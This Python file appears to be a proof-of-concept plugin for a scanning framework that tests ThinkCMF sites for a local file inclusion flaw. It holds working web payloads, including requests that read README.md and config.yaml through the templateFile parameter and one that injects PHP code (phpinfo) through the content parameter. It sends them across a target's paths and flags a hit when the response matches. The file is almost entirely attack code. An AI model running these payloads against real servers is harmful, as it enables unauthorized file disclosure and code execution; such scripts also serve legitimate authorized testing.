#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'thinkcmf lfi'
        self.keyword = ['thinkcmf', 'php']
        self.info = 'thinkcmf lfi'
        self.type = VUL_TYPE.LFI
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://www.zjun.info/2020/thinkcmfexp.html'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            poc_list = ["index.php?a=display&templateFile=README.md",
                        "index.php?a=display&templateFile=config.yaml",
                        "index.php?a=fetch&content=<php>die(phpinfo())</php> "]
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, './'):
                    for poc in poc_list:
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res != None and res.status == 200:
                                text = await res.text()
                                if '## README' in text or 'name: thinkcmf' in text or 'php.ini' in text:
                                    self.flag = 1
                                    self.res.append({"info": url, "key": "thinkcmf lfi"})
                                    return
